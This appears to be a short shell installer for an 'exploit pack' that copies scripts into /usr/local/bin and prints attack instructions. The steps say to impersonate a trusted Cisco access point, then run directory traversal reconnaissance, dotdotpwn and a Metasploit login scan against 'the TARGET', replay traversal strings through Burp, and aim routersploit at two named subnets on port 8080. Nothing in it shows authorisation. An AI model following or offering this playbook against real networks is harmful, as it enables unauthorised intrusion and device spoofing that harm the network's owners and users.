cp -r *.sh /usr/local/bin

echo "EXPLOIT PACK INSTALLED. To run against the TARGET, FIRST run impersonate_cisco_AP.sh to pretend to be one of their trusted machines and then make three separate windows and type (1) ./traversal_recon_all.sh (2) ./dotdotpwn.sh and (3) msfconsole -r login_scan.rc"

echo "Good Hunting"

echo "Do not forget to use burpsuite with firefox 8080 proxy to use burp repeater and replay the directory strings from the main page"

echo "Try running routersploit against REDACTED_SUBNET9 and REDACTED_SUBNET2 port 8080"
